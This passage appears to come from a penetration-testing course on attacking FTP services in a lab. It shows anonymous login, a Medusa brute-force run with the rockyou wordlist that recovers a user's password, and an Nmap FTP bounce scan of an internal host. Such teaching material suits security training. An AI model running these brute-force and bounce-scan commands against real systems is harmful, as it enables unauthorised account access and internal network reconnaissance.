#### Anonymous Authentication

To access with anonymous login, we can use the `anonymous` username and no password.

	AstraX01@htb[/htb]$ ftp 192.168.2.142 
	
	Connected to 192.168.2.142. 
	220 (vsFTPd 2.3.4) 
	Name (192.168.2.142:kali): anonymous 
	331 Please specify the password. 
	Password: 
	230 Login successful. 
	Remote system type is UNIX. 
	Using binary mode to transfer files. 
	ftp> ls 
	200 PORT command successful. Consider 
	using PASV. 
	150 Here comes the directory listing. 
	-rw-r--r-- 1 0 0 9 Aug 12 16:51 
	test.txt 
	226 Directory send OK.

we can use `mget`. For upload operations. we can use `put` for a simple file or `mput` for multiple files.

## Protocol Specifics Attacks

#### Brute Forcing

If there is no anonymous authentication available, we can also brute-force the login for the FTP services using a list of the pre-generated usernames and passwords.

There are many different tools to perform a brute-forcing attack. Let us explore one of them, [Medusa](https://github.com/jmk-foofus/medusa).

#### Brute Forcing with Medusa

	AstraX01@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 
	10.129.203.7 -M ftp 
	
	Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks 
	<jmk@foofus.net> 
	ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 
	1, 0 complete) Password: 123456 (1 of 14344392 complete) 
	ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 
	1, 0 complete) Password: 12345 (2 of 14344392 complete) 
	ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 
	1, 0 complete) Password: 123456789 (3 of 14344392 complete) 
	ACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: fiona Password: family [SUCCESS]

#### FTP Bounce Attack

An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a `PORT` command to trick the FTP connection into running commands and getting information from a device other than the intended server.

Consider we are targetting an FTP Server `FTP_DMZ` exposed to the internet. Another device within the same network, `Internal_DMZ`, is not exposed to the internet. We can use the connection to the `FTP_DMZ` server to scan `Internal_DMZ` using the FTP Bounce attack and obtain information about the server's open ports. Then, we can use that information as part of our attack against the infrastructure.

The `Nmap` -b flag can be used to perform an FTP bounce attack:

	AstraX01@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

Modern FTP servers include protections that, by default, prevent this type of attack, but if these features are misconfigured in modern-day FTP servers, the server can become vulnerable to an FTP Bounce attack.